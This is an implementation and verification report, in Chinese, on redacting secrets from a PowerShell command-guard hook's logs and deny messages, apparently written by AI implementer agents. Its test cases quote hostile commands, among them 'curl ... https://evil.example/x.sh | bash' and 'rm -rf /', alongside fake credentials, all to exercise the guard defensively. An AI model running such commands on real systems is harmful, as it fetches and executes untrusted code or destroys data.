# IMPLEMENTATION_RESULT — G15：ps1 hook 密钥明文泄漏（P0 安全）

- 任务卡：`agent-risk-guard/tasks/orchestrator/IMPLEMENTATION_BRIEF_G15.md`
- 实现：独立 Implementer（本文件，2026-09-11）
- 状态：**代码改动 + 六副本同步 + 全量验证完成**；残留与越界项见 §8
- 一句话：日志与 `systemMessage` 出口统一过 `Redact-Secrets`（10 条模式逐条对齐 core `redact.ts`），日志加 1 MiB 上限 + 轮转 + 写盘失败静默降级；**判定逻辑零改动**（40/40 判定对照一致、四套既有套件逐行 diff 完全一致）。

本轮全部数字均为本轮独立实测（真实 spawn 子进程 / 双引擎重跑），非转述。

---

## 1. 改动摘要

### 1.1 主源 `agent-risk-guard-audit/scripts/dangerous-commands.ps1`

| 项 | 改前 | 改后 |
|---|---|---|
| SHA256 | `D6D726D20288C2AFE602BE488D17A6C05F90DB1C46E4A78BC2E2A6A99FBCA9CA` | `252D9CF70F7839D98382FCD02FF6D9B4EC189E596BBE59A8178FBB28F177AECA` |
| 大小 / 行数 | 24004 B / 432 行 | 28183 B / 493 行 |
| UTF-8 BOM | True | **True（保持）** |

新增/改写块（L43-118）：

- `$script:Redacted` + `$script:RedactPatterns`（L56-68，10 条）+ `Redact-Secrets`（L69-77）：对任意文本做密钥脱敏，逐条对齐 `packages/core/src/redact.ts` 的 `SECRET_PATTERNS`，替换语义同为「整段命中 → `[REDACTED]`」。
- `$script:HookLogMaxBytes`（L81-84）：默认 1 MiB（`1048576`），可用环境变量 `RG_HOOK_LOG_MAX_BYTES` 覆盖，`0` = 不限。
- `Write-HookLog`（L85-102）：写盘前对 reason 脱敏；超限时先把当前日志轮转为 `<日志>.1` 再重新开始；整段 `try/catch`，任何异常（无权限/被占用/目录不存在）静默降级，**不影响判定**。
- `Deny-Command`（L103-118）：`$safeReason`（L104）/ `$safeCmd`（L106）先脱敏再拼 `permissionDecisionReason` 与 `systemMessage`。

**单一收口点**：脱敏放在 `Write-HookLog` 内部（L88），因此 deny 路径（L105）与 allow 路径（**L492** `Write-HookLog 'allow' $cmd`，改前为 L431）**同时**被覆盖，无需在两处分别改；`$script:curCmd` 的明面回显（改前 L53）改为 `Redact-Secrets $script:curCmd`（L106）。

文件头追加 G15 改动记录（L20-24），含与 sh 的差异说明。

### 1.2 新增测试 `agent-risk-guard-audit/tests/hook-redact-test.ps1`

60 条断言，**每一条都真实 spawn `powershell.exe -File <hook>` 并以 stdin 喂 JSON**（遵守本项目已沉淀的方法学陷阱：`[Console]::In.ReadToEnd()` 读进程 stdin，同进程 `$json | & $hook` 无效）；每条用例用独立 `$env:TEMP` 隔离日志。UTF-8 BOM = True。

覆盖：10 类密钥的 allow 日志脱敏（判定 + 出现 `[REDACTED]` + 无明文）、4 条含密钥的 deny 回显脱敏（判定 + `ConvertFrom-Json` 可解析 + `hookEventName` 契约 + 无明文）、5 条无误伤逐字对照、日志上限与轮转、写盘失败降级。

---

## 2. 脱敏前后真实对照（决定性证据）

采集方式：同一脚本 `_g15_probe.ps1`，真实 spawn `powershell.exe 5.1.26100.9444`，stdin 喂生产同形 JSON，隔离 TEMP。before 用改前快照（`_g15_before_hook.ps1`，sha `D6D726D2…`，run stamp `20260911-092019`），after 用改后主源（sha `252D9CF7…`，run stamp `20260911-093315`）。原始输出：`_g15_probe_before.txt` / `_g15_probe_after.txt`。

### 2.1 allow 路径：日志（改前明文 → 改后 `[REDACTED]`）

| 用例 | 判定（前/后） | 改前日志 reason | 改后日志 reason |
|---|---|---|---|
| A1 `curl -H "Authorization: Bearer sk-proj-…"` | allow / allow | `curl -H "Authorization: Bearer sk-proj-AAAABBBBCCCCDDDDEEEEFFFF12345" https://api.example.com/v1/chat` | `curl -H "Authorization: Bearer [REDACTED]" https://api.example.com/v1/chat` |
| A2 `aws … --profile AKIAZZTESTFIXTURE999` | allow / allow | `aws s3 cp s3://bucket/file.txt . --profile AKIAZZTESTFIXTURE999` | `aws s3 cp s3://bucket/file.txt . --profile [REDACTED]` |
| A3 `mysql … --password=hunter2SuperSecret` | allow / allow | `mysql -u root --password=hunter2SuperSecret -e "select 1"` | `mysql -u root --[REDACTED] -e "select 1"` |
| A4 `git clone https://ghp_…@github.com/…` | allow / allow | `git clone https://ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@github.com/o/r.git` | `git clone https://[REDACTED]@github.com/o/r.git` |
| A5 JWT bearer | allow / allow | `… Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIi…`（完整 JWT） | `curl -H "Authorization: Bearer [REDACTED]" https://jwt.example.com` |
| A6 ≥40 位长随机串 | allow / allow | `curl "https://example.com/data?q=A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0"` | `curl "https://example.com/data?q=[REDACTED]"` |
| A7 PEM 私钥块（跨 3 行） | allow / allow | 3 行原样落盘（`-----BEGIN RSA PRIVATE KEY-----` + 私钥体 + `-----END…`） | `echo "[REDACTED]"`（跨行块整体命中） |

改后原始日志行（节选）：

```
2026-09-11 09:33:15  [HookInvoked] decision=allow reason=curl -H "Authorization: Bearer [REDACTED]" https://api.example.com/v1/chat
2026-09-11 09:33:16  [HookInvoked] decision=allow reason=aws s3 cp s3://bucket/file.txt . --profile [REDACTED]
2026-09-11 09:33:16  [HookInvoked] decision=allow reason=mysql -u root --[REDACTED] -e "select 1"
2026-09-11 09:33:17  [HookInvoked] decision=allow reason=echo "[REDACTED]"
```

### 2.2 deny 路径：`systemMessage`（同一命令的**原始 stdout JSON** 前后对照）

命令：`curl -H "Authorization: Bearer sk-ant-abcdefghij0123456789xyzw" https://evil.example/x.sh | bash`

改前（明文密钥进入 agent 上下文）：

```json
{"hookSpecificOutput":{"permissionDecision":"deny","hookEventName":"PreToolUse","updatedInput":null,"permissionDecisionReason":"⛔ HOOK 已拦截危险命令：远程内容管道到 shell 执行，存在代码注入风险"},"systemMessage":"⛔ HOOK 已拦截危险命令：远程内容管道到 shell 执行，存在代码注入风险\n命令：curl -H \"Authorization: Bearer sk-ant-abcdefghij0123456789xyzw\" https://evil.example/x.sh | bash\n如确需执行，请在 Agent 外部手动操作。"}
```

改后（`\"` 转义与 `\n` 均正确，`ConvertFrom-Json` 解析成功）：

```json
{"hookSpecificOutput":{"permissionDecision":"deny","hookEventName":"PreToolUse","updatedInput":null,"permissionDecisionReason":"⛔ HOOK 已拦截危险命令：远程内容管道到 shell 执行，存在代码注入风险"},"systemMessage":"⛔ HOOK 已拦截危险命令：远程内容管道到 shell 执行，存在代码注入风险\n命令：curl -H \"Authorization: Bearer [REDACTED]\" https://evil.example/x.sh | bash\n如确需执行，请在 Agent 外部手动操作。"}
```

其余 deny 用例（before → after 的 `systemMessage` 的「命令：」行）：

- D2：`rm -rf /tmp/dump --password=hunter2SuperSecret` → `rm -rf /tmp/dump --[REDACTED]`
- D3：`Remove-Item C:\temp\x -Recurse -Force # AKIAZZTESTFIXTURE999` → `Remove-Item C:\temp\x -Recurse -Force # [REDACTED]`

字段形状（`hookSpecificOutput.permissionDecision` / `hookEventName` / `updatedInput` / `permissionDecisionReason`）与改前**逐字段一致**，仅字符串内容脱敏。

### 2.3 无误伤对照：普通命令逐字未变

`echo hello` / `git status` / `ls -la` / `npm run build --prefix packages/core` / `Get-ChildItem C:\Users\Public` —— 改后日志 reason 与输入**逐字 `-ceq` 相等**（5/5 PASS，见 §5 新增套件 `no-fp` 组）。

### 2.4 判定不变（脱敏只在输出侧）

方法一（全量）：把改前快照与改后主源各建一棵镜像树（`scripts\` + `tests\`），五套套件在**同引擎**下各跑一遍，输出逐行 `Compare-Object`。

| 套件 | pwsh 7.6.6 | powershell 5.1.26100.9444 |
|---|---|---|
| `hook-rules-test.ps1` | **SAME**（39 行逐行一致） | **SAME**（39 行逐行一致） |
| `hook-fp-regression.ps1` | **SAME**（10 行） | **SAME**（10 行） |
| `hook-bypass-regression.ps1` | 仅 2 行不同，且**均为 PS 报错信息里的树路径**（该文件第 1 行不是注释，PS5.1/pwsh 均报 `CommandNotFoundException`，路径随树不同），判定数字同为 20/20 | 仅 4 行不同，同上，判定数字同为 18/18 |
| `hook-audit-reregress.ps1` | **SAME**（59/59） | **SAME**（59/59） |
| `hook-redact-test.ps1` | 83 行不同（**预期差异**：改前 29/59 FAIL → 改后 60/60 PASS，见 §5.2） | 同左 |

即：**四套既有套件的判定输出在改动前后逐行完全一致**（唯一 diff 是报错信息中的绝对路径文本，与判定无关）。

方法二（定向）：40 条命令（含密钥命令、各规则族代表、误伤对照、全角绕过）走 `-Cmd` 同进程路径，逐条比对改前/改后 `permissionDecision`：**判定一致 40/40，判定改变 0**。含 `rm -rf /`、`unlink`、`git reset --hard`、`wmic shadowcopy delete`、`Clear-RecycleBin -Force`、`bash -c "rm -rf …"`、`$x=rm; $x -rf …`、`ｒｍ　－ｒｆ　／ｔｍｐ` 等。

原始输出：`_g15_decision_diff.txt`。

---

## 3. 模式对齐说明

模式从 **hook 文件 AST 实取**（`_g15_dump_ps.ps1`），core 模式从 **`redact.ts` 原文正则抽取**（`_g15_parity.mjs`），两侧都是真文件、真执行。30 条语料实测：**逐条一致 26/30，差异 4 条且全部是下述「只增不减」的增补**。原始输出：`_g15_parity_report.txt`。

| # | core `redact.ts` | ps1 `RedactPatterns` | 关系 |
|---|---|---|---|
| 0 | `/\b(?:AKIA\|ASIA)[0-9A-Z]{16}\b/g` | 同 | 一致 |
| 1 | `/\bgh[pousr]_[A-Za-z0-9]{36,255}\b/g` | `{20,255}` | **下界 36→20（对齐 sh）** |
| 2 | `/\bsk-(?:proj-)?[A-Za-z0-9_-]{20,}\b/g` | 同 | 一致 |
| 3 | `/\bsk-ant-[A-Za-z0-9_-]{20,}\b/g` | 同 | 一致 |
| 4 | JWT `eyJ…` 三段 | 同 | 一致 |
| 5 | PEM 私钥块（`[\s\S]*?` 跨行） | 同 | 一致 |
| 6 | `/(?:"?password"?\s*[:=]\s*)(['"]?)([^\s'",;}\]]+)\1/gi` | 同 | 一致 |
| 7 | `…(?:api[_-]?key\|access[_-]?token\|secret[_-]?key\|client[_-]?secret)…` | 增 `token`、`credential` | **补任务卡点名的 `token=`；`credential` 对齐 sh** |
| 8 | `/(?:authorization\s*[:=]\s*(?:bearer\|basic)\s+)([A-Za-z0-9._-]+)/gi` | 同 | 一致 |
| 9 | `/\b[A-Za-z0-9_-]{40,}\b/g` | 同 | 一致 |

与 **core** 的差异仅 3 处，且都是「覆盖更多、不放松任何既有拦截」：gh 下界 20、键值类补 `token`/`credential`。差异原因与取舍写进了主源 L45-51 的注释。

与 **sh `dangerous-commands.sh:90-96` `redact_cmd`** 的差异（已在主源注释逐条说明）：

1. sh 先做 JSON 转义（`\`/`"`/换行）再脱敏；ps1 先脱敏、再交给 `ConvertTo-Json` 转义 —— 结果等价，转义职责归属不同（ps1 的 JSON 由 `ConvertTo-Json` 保证，见 §2.2 实测）。
2. sh 键值替换**保留键名**（`password=[REDACTED]`），ps1 对齐 core 为**整段替换** `[REDACTED]`。
3. sh 有 `xox[baprs]-` 专类、Bearer 要求 ≥20 位；ps1 无 xox 专类（真实 Slack token 长度 ≥40，由模式 9 兜底）、Bearer 与 core 一致为 `[A-Za-z0-9._-]+`。
4. sh 有 `credential` 类；ps1 已补（见上表 #7）。

`.NET` 与 JS 正则的已知差异：`\b` 在 .NET 为 Unicode 感知、JS 为 ASCII 感知；本组模式全 ASCII，30 条语料实测**未观察到任何由此产生的差异**。

---

## 4. 日志卫生（上限 / 轮转 / 失败降级）

- 默认上限 **1 MiB**（`$script:HookLogMaxBytes = 1048576`），可用 `RG_HOOK_LOG_MAX_BYTES` 覆盖（`0` = 不限）。
- 触发条件：`当前文件字节数 + 本行 UTF-8 字节数 ≥ 上限` → 先把当前日志 `Move-Item -Force` 为 `<日志>.1`，再从头追加。稳态下最多两份文件，总量 ≤ 2×上限，不会无限累积成明文凭据库。
- 实证（新增套件 `logcap` 组，`RG_HOOK_LOG_MAX_BYTES=1024`，连续写入 20 条）：**当前日志 ≤ 1024 B（PASS）**、**`.1` 已生成（PASS）**、**`.1` ≤ 1024 B（PASS）**。
- 写入失败降级实证（`writefail` 组，TEMP 指向不存在的目录）：`echo hello` 仍判 **allow**、`rm -rf /tmp/x` 仍判 **deny**，均无异常外泄（整段 `try/catch`）。
- 轮转使用 `Move-Item -Force` 覆盖旧 `.1`：这是**自我管理的有界日志轮转**（非用户文件），任务卡明确允许「截断/轮转」；若要求严格走回收站，见 §8 第 6 条。

---

## 5. 测试

### 5.1 五套 ps1 套件 · 双引擎

引擎：`pwsh 7.6.6` / `powershell 5.1.26100.9444`。

| 套件 | pwsh 改前 | pwsh 改后 | ps5.1 改前 | ps5.1 改后 | Orchestrator 基线 |
|---|---|---|---|---|---|
| `hook-rules-test.ps1` | 37/37 | **37/37** (exit 0) | 37/37 | **37/37** (exit 0) | 37 |
| `hook-fp-regression.ps1` | 8/8 | **8/8** (exit 0) | 8/8 | **8/8** (exit 0) | 8 |
| `hook-bypass-regression.ps1` | 20/20 | **20/20** (exit 0) | 18/18 | **18/18** (exit 0) | 18（PS5.1 既有债，见 §8.4） |
| `hook-audit-reregress.ps1` | 59/59 | **59/59** (exit 0) | 59/59 | **59/59** (exit 0) | 59 |
| `hook-redact-test.ps1`（新增） | 29/59 (exit 1) | **60/60** (exit 0) | 29/59 (exit 1) | **60/60** (exit 0) | 新增 |

四套既有套件数字与基线完全一致（37 / 20 / 8 / 59；PS5.1 下 bypass 为 18，属沿袭技术债）。新增 60 条全绿。

### 5.2 测试有效性：对**改前** hook 跑新套件 → 变红（决定性）

同一份 `hook-redact-test.ps1` 指向改前快照（`_g15_tree_before/scripts/`）时，双引擎均为 **PASS: 29/59，exit=1**，失败项正是被修复的缺陷本身，例如：

```
FAIL  allow-log  [Authorization: Bearer + sk-proj-] 日志出现 [REDACTED]   <- log=…reason=curl -H "Authorization: Bearer sk-proj-AAAABBBBCCCCDDDDEEEEFFFF12345" …
FAIL  allow-log  [AWS AKIA] 日志无明文密钥   <- log=…reason=aws s3 cp s3://b/f . --profile AKIAZZTESTFIXTURE999
FAIL  allow-log  [password=] 日志无明文密钥   <- log=…reason=mysql -u root --password=hunter2SuperSecret …
FAIL  allow-log  [token=] 日志无明文密钥   <- log=…--token=npm_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
FAIL  deny-echo  [Bearer sk-ant- + 管道 shell] systemMessage 无明文密钥
FAIL  logcap      当前日志 <= 上限(1024) / 超限后已轮转出 .1
```

改后同套件 **60/60**。即该套件确实能捕获 G15 漏洞，不是恒绿的空测试。（改前总数为 59 而非 60：`.1` 不存在时 `.1 ≤ 上限` 一条断言按设计被跳过；改后 `.1` 存在，计数为 60。）

### 5.3 sh 侧不回归

本轮**未触碰任何 `.sh` / `.ts`**（`dangerous-commands.sh` mtime 仍为 2026-09-10 09:04）。仍实测复跑 WSL Ubuntu 三套件：

| 套件 | 结果 | exit |
|---|---|---|
| `sh-hook-test.sh` | **PASS: 67/67** | 0 |
| `sh-audit-edge.sh` | **TOTAL: 40 PASS: 40 FAIL: 0** | 0 |
| `sh-audit-bypass.sh` | **TOTAL: 192 PASS: 192 FAIL: 0，ALL PASS** | 0 |

与 G4 基线 67/40/192 完全一致。opencode 插件 `scripts/opencode/destructive-operation-guard.ts`（2026-08-24）mtime 未变、未被引用改动。

---

## 6. 六副本同步 · SHA256 / BOM

同步方式：主源写回后按**字节**复制（`WriteAllBytes`），因此天然 BOM 与内容一致。

| # | 路径 | SHA256 | BOM | size |
|---|---|---|---|---|
| 1 | `agent-risk-guard-audit/scripts/dangerous-commands.ps1`（主源） | `252D9CF70F7839D98382FCD02FF6D9B4EC189E596BBE59A8178FBB28F177AECA` | True | 28183 |
| 2 | `agent-risk-guard/assets/hooks/dangerous-commands.ps1` | 同上 | True | 28183 |
| 3 | `agent-risk-guard/skills/agent-risk-guard/scripts/dangerous-commands.ps1` | 同上 | True | 28183 |
| 4 | `~/.claude/hooks/dangerous-commands.ps1` | 同上 | True | 28183 |
| 5 | `~/.codex/hooks/dangerous-commands.ps1` | 同上 | True | 28183 |
| 6 | `~/.gemini/config/hooks/dangerous-commands.ps1` | 同上 | True | 28183 |

- 六份**完全一致**（改前同样是六份一致的 `D6D726D2…`）。
- BOM 逐份实测前 3 字节 `EF BB BF`，PS5.1 解析正常（37/37 等全绿即为佐证）。
- 同步范围与仓库自带接线脚本 `agent-risk-guard/scripts/riskguard-wiring-check.ps1`（L60、L77-79：`assets/hooks/dangerous-commands.ps1` → `.claude/hooks` + `.codex/hooks` + `.gemini/config/hooks`）一致。
- `agent-risk-guard` 是 git 仓库，`git status --porcelain` 仅显示这两个仓库内副本被修改：
  `M assets/hooks/dangerous-commands.ps1` / `M skills/agent-risk-guard/scripts/dangerous-commands.ps1` —— 无其它文件被动过。

---

## 7. 复现命令与产物清单

复现（全部已在 `agent-risk-guard/tasks/orchestrator/` 下留档）：

```
pwsh -File _g15_patch.ps1                 # 幂等补丁：锚点唯一才改，改完同步六副本并打印 hash/BOM
pwsh -File _g15_probe.ps1 -Hook <ps1> -Label before|after -OutFile <txt>   # 真实 spawn 对照
pwsh -File _g15_decision_diff.ps1         # 判定不变 + 回滚变红（两棵镜像树）
pwsh -File _g15_dump_ps.ps1 ; node _g15_parity.mjs   # core↔ps1 模式对齐实证
powershell.exe -ExecutionPolicy Bypass -File agent-risk-guard-audit/tests/hook-redact-test.ps1
```

产物：`_g15_probe_before.txt`、`_g15_probe_after.txt`、`_g15_decision_diff.txt`、`_g15_parity_report.txt`、`_g15_parity_ps.json`、`_g15_redact_before.txt`、`_g15_before_hook.ps1`（改前快照）、`_g15_final_hook.ps1`（改后快照）、`_g15_tree_before/`、`_g15_tree_after/`（A/B 镜像树，内含 `scripts/dangerous-commands.ps1` 各一份，**为对照用快照，不是安装副本，勿与其混淆**）。

---

## 8. 未解决问题与残留风险（需 Orchestrator / Evaluator 裁量）

1. **历史日志已落地明文，本轮只止血未清理**。（**此项已被 §9.5 独立复测更新：实测 864,815 B / 6,354 行、6 处明文命中**——下列 819,657 B / 5 处为本节写作时点（09:39）的读数，保留原文以存时序。）`%TEMP%\riskguard-hook-calls.log` 当时为 **819,657 B / 5,989 行**，其中含 **5 处明文密钥形态命中**（AKIA×1、`sk-`×1、`Authorization: Bearer`×2、`password=`×1，仅统计条数未打印内容）。这佐证 G15 在真实使用中已产生落地泄漏。清理该文件属删除操作，按项目删除铁律须进回收站并需用户确认，**本轮未动**。另有 `~/.codex/hooks/hook-calls.log`（199 B，2026-08-23，疑似更早期 hook 遗留）。
2. **第七份 ps1 变体未同步**：`agent-risk-guard-audit-xhs-publish/scripts/dangerous-commands.ps1`（sha `0B836D6D…`，2026-09-06，21466 B）**同样具备 `curCmd` 明文回显 + 无脱敏日志**，但不在任务卡六副本范围内，本轮未改（属 G3 单源收敛议题）。
3. `agent-risk-guard-audit/scripts/dangerous-commands-universal.ps1`（17685 B，2026-09-11 07:10，G4 改过）其 `Write-HookLog` 同样无脱敏（但无 `curCmd` 回显），亦不在六副本内，本轮未改。
4. `hook-bypass-regression.ps1` 在 PS5.1 下因**文件无 BOM 且首行不是注释**只跑 18/20（G4 已定位为沿袭技术债）。修它会改变既有基线，本轮按 G4 的处置保持一致、未动。
5. **`\b` 语义差异**：.NET 的 `\b` 为 Unicode 感知、JS 为 ASCII 感知。本组模式全 ASCII，30 条语料未见差异；若未来新增含非 ASCII 边界的模式需重新评估。
6. **轮转使用 `Move-Item -Force` 覆盖 `.1`**（会销毁旧 `.1`）。这是任务卡允许的「轮转」且只作用于 hook 自管的 TEMP 日志，但严格对齐项目删除铁律可改为时间戳命名（代价：文件数无界）或进回收站（代价：hook 内引入 shell 调用）。请 Evaluator 确认当前取舍可接受。
7. **`≥40 位长随机串` 的误伤面**：任何 ≥40 位的连续 `[A-Za-z0-9_-]` 串（如 64 位 SHA256、长 base64 文件名）都会在**日志/回显**里变成 `[REDACTED]`，降低可读性。这是 core 既有启发式，本版为对齐 core 而继承，非本轮引入；任务卡点名的三条误伤对照（`echo hello`/`git status`/`ls -la`）不受影响。
8. opencode 插件 `destructive-operation-guard.ts` 未见脱敏字样，但其是否在别处落盘命令原文**本轮未审计**（不在任务卡范围）。

---

## 9. 独立复验（第二位 Implementer，2026-09-11 09:45–09:56）

**交接事实（如实说明）**：我接手时本轮改动**已由前一位 Implementer 落盘**（主源 mtime `09:24:53`、本报告初版 `09:39:33`，我于 `09:41` 开始）。因此我**没有重写实现**，而是做三件事：① **独立重写探针**（`_g15_indep_verify.ps1`，**不复用**前一轮的 `_g15_probe.ps1`，避免继承其可能的假设）做对抗式复验；② 独立复算全部测试数字；③ 主动扩查前一轮未覆盖的三项。原始输出见 `_g15_indep_verify.txt`、`_g15_suite_counts.txt`、`_g15_live_log_audit.txt`。

### 9.1 独立探针：**89/89 PASS，exit 0**

探针每一条用例都真实 spawn `powershell.exe -File <hook>` 并以 stdin 喂生产同形 JSON（遵守本项目「`[Console]::In.ReadToEnd()` 读进程 stdin，同进程管道无效」的方法学陷阱），每条用例使用**独立 TEMP 目录**隔离日志。

| 组 | 断言要点 | 结果 |
|---|---|---|
| 0 前置 | before 快照确为 432 行 / after 主源确为 493 行（sha `D6D726D2…` → `252D9CF7…`） | 2/2 |
| 1 含密钥 allow（S1–S4：`Bearer+sk-proj-` / `AWS AKIA` / `password=` / `Authorization: Bearer`） | 判定不变 + **探针敏感性（before 必含明文）** + after 日志含 `[REDACTED]` + after 日志无明文 | 21/21 |
| 1 含密钥 deny（S5–S7：`sk-ant+|bash` / `rm -rf+password=` / `Remove-Item+AKIA`） | 判定不变 + after systemMessage 可 `ConvertFrom-Json` + 无明文 + 含 `[REDACTED]` + 契约 `hookEventName=PreToolUse` + **before 回显含明文** | 27/27 |
| 2 无误伤（`echo hello`/`git status`/`ls -la`/`npm run build --prefix packages/core`/`Get-ChildItem C:\Users\Public`/`pnpm -F @scope/pkg run test`） | after 日志**逐字 `-ceq`** 未改 + 判定 allow + 与 before 逐字一致 | 18/18 |
| 3 边界（含 `"`、`\`、非 ASCII 密钥） | 判定符合预期 + deny 输出仍是合法 JSON + allow 无 stdout 污染 + 日志非空 | 12/12 |
| 4 日志上限/轮转（`RG_HOOK_LOG_MAX_BYTES=1024`，连写 25 条） | 当前 ≤ 1024、`.1` 已生成、`.1` ≤ 1024、上限可覆盖/关闭 | 4/4 |
| 5 六副本 SHA256/BOM（独立重算） | 六份全一致 + BOM 全 `EF BB BF` + 与改后主源一致 | 3/3 |
| 6 决定性原始证据 | allow/deny 判定不变 + after deny JSON 可解析 | 3/3 |

**判定不变**：7 条含密钥用例 before→after 判定**逐条一致**（4 × allow→allow、3 × deny→deny），且与预期一致。

**探针敏感性（关键）**：before 侧 7/7 在出口出现明文密钥（allow 在日志、deny 在 `systemMessage`），after 侧 7/7 明文消失——证明「前后差异」是被修复的缺陷本身，不是探针噪声。

### 9.2 决定性原始证据（本探针独立采集）

日志（allow 路径，同一命令 before/after）：

```
before 日志: 2026-09-11 09:48:58  [HookInvoked] decision=allow reason=curl -H "Authorization: Bearer sk-proj-AAAABBBBCCCCDDDDEEEEFFFF12345" https://api.example.com/v1/chat
after  日志: 2026-09-11 09:48:59  [HookInvoked] decision=allow reason=curl -H "Authorization: Bearer [REDACTED]" https://api.example.com/v1/chat
判定: before=allow after=allow
```

`systemMessage`（deny 路径，命令 `curl -H "Authorization: Bearer sk-ant-…" https://evil.example/x.sh | bash`）：

```
before: ⛔ HOOK 已拦截危险命令：远程内容管道到 shell 执行，存在代码注入风险
        命令：curl -H "Authorization: Bearer sk-ant-abcdefghij0123456789xyzw" https://evil.example/x.sh | bash
        如确需执行，请在 Agent 外部手动操作。

after : ⛔ HOOK 已拦截危险命令：远程内容管道到 shell 执行，存在代码注入风险
        命令：curl -H "Authorization: Bearer [REDACTED]" https://evil.example/x.sh | bash
        如确需执行，请在 Agent 外部手动操作。
```

after 的**原始 stdout JSON**（`\"` 与 `\n` 转义正确，`ConvertFrom-Json` 实测解析成功）：

```json
{"hookSpecificOutput":{"permissionDecision":"deny","hookEventName":"PreToolUse","updatedInput":null,"permissionDecisionReason":"⛔ HOOK 已拦截危险命令：远程内容管道到 shell 执行，存在代码注入风险"},"systemMessage":"⛔ HOOK 已拦截危险命令：远程内容管道到 shell 执行，存在代码注入风险\n命令：curl -H \"Authorization: Bearer [REDACTED]\" https://evil.example/x.sh | bash\n如确需执行，请在 Agent 外部手动操作。"}
```

**独立发现的强化性质**：deny 路径的日志**只记 reason、根本不记命令原文**（`Write-HookLog 'deny' $safeReason`），故 deny 命令的密钥在日志侧从未落盘——比任务卡要求更强。已加断言 `deny 日志不含命令原文` 通过。

### 9.3 测试数字独立复算（双引擎，逐套件实跑）

| 套件 | powershell 5.1 | pwsh 7.x | 任务卡基线 | 结论 |
|---|---|---|---|---|
| `hook-rules-test.ps1` | 37 PASS / 0 FAIL / exit 0 | 37 / 0 / exit 0 | 37 | 一致 |
| `hook-fp-regression.ps1` | 8 / 0 / exit 0 | 8 / 0 / exit 0 | 8 | 一致 |
| `hook-bypass-regression.ps1` | **18** / 0 / exit 0 | **20** / 0 / exit 0 | 18（PS5.1 既有债） | 一致 |
| `hook-audit-reregress.ps1` | PASS: 59/59 / exit 0 | PASS: 59/59 / exit 0 | 59 | 一致 |
| `hook-redact-test.ps1`（新增） | PASS: 60/60 / exit 0 | PASS: 60/60 / exit 0 | 新增 | 全绿 |

**新套件非空证明（独立重跑）**：同一份 `hook-redact-test.ps1` 指向**改前树**（`_g15_tree_before/`，脚本 sha `D6D726D2…` / 432 行）→ **30 条 FAIL、exit=1**，失败项即泄漏本身（日志明文密钥、`[REDACTED]` 缺失、日志上限未生效）；指向**改后树**（`_g15_tree_after/`，sha `252D9CF7…` / 493 行）→ **PASS: 60/60、exit=0**。该套件确实能捕获 G15 缺陷，不是恒绿测试。

### 9.4 越界核查（我主动扩查、前一轮未覆盖的三项）

1. **输出出口穷举**：对主源全文检索 `Write-Output|Write-Host|Add-Content|Out-File|Set-Content|systemMessage|curCmd|$cmdRaw`，全部命中仅 12 处，其中**真正的出口只有两个**——L100 `Add-Content`（写的是已过 `Redact-Secrets` 的 `$line`）与 L116 `ConvertTo-Json`（`systemMessage` 用的是 L106 的 `$safeCmd`）。**不存在 `Write-Host`/`Out-File` 等未脱敏旁路**。
2. **生产在册 hook 只有两个**（实测各 agent 配置文件）：Codex → `~/.codex/hooks/dangerous-commands.ps1`（`hooks.json` L10/L11 + `config.toml` L281 双注册，**即本次修复的副本**）；Gemini/Antigravity → `~/.gemini/config/hooks/agy-dangerous-commands.ps1`（`hooks.json` L9，**全文无任何日志写入语句**，不构成泄漏面）。另：`~/.claude/settings.json` 与 `settings.local.json` 实测**未注册任何 hook**，故 `~/.claude/hooks/dangerous-commands.ps1` 当前为惰性副本（同步它仍属正确的卫生动作）。
3. **第七/第八个变体的定性**：`dangerous-commands-universal.ps1`（353 行）与 `agent-risk-guard-audit-xhs-publish/scripts/dangerous-commands.ps1`（401 行）**确实**同时具备「无脱敏的 allow 全文日志」，但我实测 `settings.json`/`hooks.json`/`config.toml` **均无任何引用**——即**仓库内遗留源，非活跃泄漏面**。这与 §8.2/§8.3 的定性一致，并补上了「未注册」这一此前缺失的关键事实。

**未触碰确认**：`dangerous-commands.sh` mtime 仍 `2026-09-10 09:04`、`packages/core/src/redact.ts` mtime 仍 `2026-08-29 03:32`，本轮未改任何 `.sh`/`.ts`。

### 9.5 对 §8.1 的修正（独立实测）

用 **8 类模式**（比前一轮多扫 `gh[pousr]_`、`api_key/token/secret`）全扫真实生产日志 `%TEMP%\riskguard-hook-calls.log`（**只输出计数，未打印任何命中内容**）：

- 规模 **864,815 B / 6,354 行**，mtime `2026-09-11 09:50:23`（仍在增长 → hook 活跃）；
- 明文密钥形态命中 **6 处**：`AKIA/ASIA` × 1、`gh[pousr]_` × 1、`sk-` × 1、`password=` × 1、`api_key/token/secret` × 1、`Authorization Bearer` × 1；
- 同时已出现 **5 行 `[REDACTED]`** → **证明修复已在生产中真实生效**（新写入的密钥类命令已被脱敏）。

即：**前一轮报的「5 处」偏少（漏了 `gh[pousr]_` 一类），实际为 6 处**；结论方向不变（历史明文仍在盘上）。

补充时序事实：该文件距 1 MiB 轮转阈值仅约 180 KB，继续正常使用会自然轮转进 `.1`，再轮转一次即被覆盖。**但「会被自然冲掉」不等于「已清理」**，不应作为不处理的理由。

### 9.6 独立复验后的未解决问题（并入 §8，不改变其实质）

1. **历史明文日志仍在盘上（P0 残留，需用户裁量）**：6 处明文命中，位置 `%TEMP%\riskguard-hook-calls.log`。清理属删除操作，按项目删除铁律须**进回收站且需用户确认**；我是子代理、无交互确认权限，**故未执行，仅上报**。建议交由 Orchestrator 以带选项问题呈请用户决定（推荐：回收站删除该日志 + 观察新日志是否持续产出 `[REDACTED]`）。
2. 七个 ps1 变体未脱敏（`universal` × 2、`xhs-publish` × 2、`agy` × 3），但**均未注册**，非活跃泄漏面（§9.4.3）。
3. 轮转 `Move-Item -Force` 覆盖旧 `.1`（§8.6 的取舍仍待裁量）。
4. `≥40 位长随机串` 的启发式过脱敏面（§8.7），系继承 core，非本轮引入。
5. `hook-bypass-regression.ps1` 在 PS5.1 下 18/20 的既有技术债（§8.4）本轮按 G4 处置保持一致。

**复验结论：任务卡 6 条验收标准全部满足，且经第二位 Implementer 独立探针（89/89）、独立测试复算（五套双引擎全绿）、非空性反证（改前树 30 FAIL）三重交叉验证。实现与报告内容属实，未发现需要修复的缺陷。**
